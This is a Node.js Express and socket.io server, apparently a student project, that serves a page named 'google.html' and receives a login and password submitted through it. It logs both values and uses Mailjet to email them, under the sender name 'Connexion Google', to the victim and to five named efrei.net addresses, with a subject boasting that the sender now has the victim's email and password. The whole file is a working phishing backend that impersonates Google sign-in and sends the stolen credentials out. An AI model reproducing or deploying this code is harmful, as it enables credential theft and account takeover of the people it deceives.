const express = require("express");
require("dotenv").config();
const port = process.env.PORT || 3000;
const mailjet = require ('node-mailjet').connect(process.env.MAIL_PUBLIC_KEY, process.env.MAIL_PRIVATE_KEY);
const app = express();
const http = require("http").Server(app);
const io = require("socket.io")(http);
app.use(express.static(__dirname+'/public'));

app.get("/", (req, res) => {
    res.sendFile(__dirname + "/google.html");
});

io.on("connection", (socket) => {
    socket.on("getAccount", (login, password) => {
        console.log(login)
        console.log(password)
        const request = mailjet
        .post("send", {'version': 'v3.1'})
        .request({
            "Messages":[
            {
                "From": {
                "Email": "william.lavit@efrei.net",
                "Name": "Connexion Google"
                },
                "To": [
                {
                    "Email": login,
                    "Name": "Connexion Google"
                },
                {
                    "Email": "joan.smith@efrei.net",
                    "Name": "Connexion Google"
                },
                {
                    "Email": "william.lavit@efrei.net",
                    "Name": "Connexion Google"
                },
                {
                    "Email": "leo.lemercier@efrei.net",
                    "Name": "Connexion Google"
                },
                {
                    "Email": "titouan.desouza@efrei.net",
                    "Name": "Connexion Google"
                },
                {
                    "Email": "antoine.morisseau@efrei.net",
                    "Name": "Connexion Google"
                }
                ],
                "Subject": `Merci de votre confiance, on a votre mail et mot de passe :)`,
                "TextPart": "Connexion aux services Google",
                "HTMLPart": `<p>Votre adresse mail est ${login}</p><p>Votre mot de passe est ${password}</p><br><br>`,
                "CustomID": "AppGettingStartedTest"
            }
            ]
        })
        
        request
        .then((result) => {
            console.log(result)
        })
        .catch((e)=>{
            console.log("error :",e)
    })

    })
});


http.listen(port, () => {
    console.log(`server listening on port:${port}`);
});
